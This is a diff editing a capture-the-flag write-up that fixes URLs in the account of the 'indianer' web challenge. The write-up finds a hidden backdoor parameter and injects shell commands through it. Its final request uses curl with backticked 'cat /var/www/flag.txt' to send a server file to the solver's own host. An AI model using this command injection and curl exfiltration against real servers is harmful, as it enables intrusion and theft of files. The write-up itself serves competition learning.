@@ -29,13 +29,13 @@ so we make our prog to get the arg name
 
 and it was "dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp" So this is the second part 
 
-https://indianer.flatearth.fluxfingers.net//x00ndex.html?dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=
+https://indianer.flatearth.fluxfingers.net/x00ndex.html?dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=
 
 what Next?
 
 first what we tried to do it to understand where the flag will be shown
 
-We tried first simple check like https://indianer.flatearth.fluxfingers.net/index.html_dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=ls
+We tried first simple check like https://indianer.flatearth.fluxfingers.net/x00index.html_dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=ls
 
 but for sure no output there :(
 
@@ -59,7 +59,7 @@ So we need curl? ok so we will send the flag to our server using curl
 
 So our last solution was to make this request and its work :D 
 
-https://indianer.flatearth.fluxfingers.net//x00ndex.html?dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=curl_serverip/`cat_/var/www/flag.txt`
+https://indianer.flatearth.fluxfingers.net/x00ndex.html?dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=curl_serverip/`cat_/var/www/flag.txt`
 
 
 ![capture d ecran 2017-10-19 a 11 15 22 am](https://user-images.githubusercontent.com/7364615/31767276-57b35d0a-b4c2-11e7-8f09-1a162d4cc949.png)
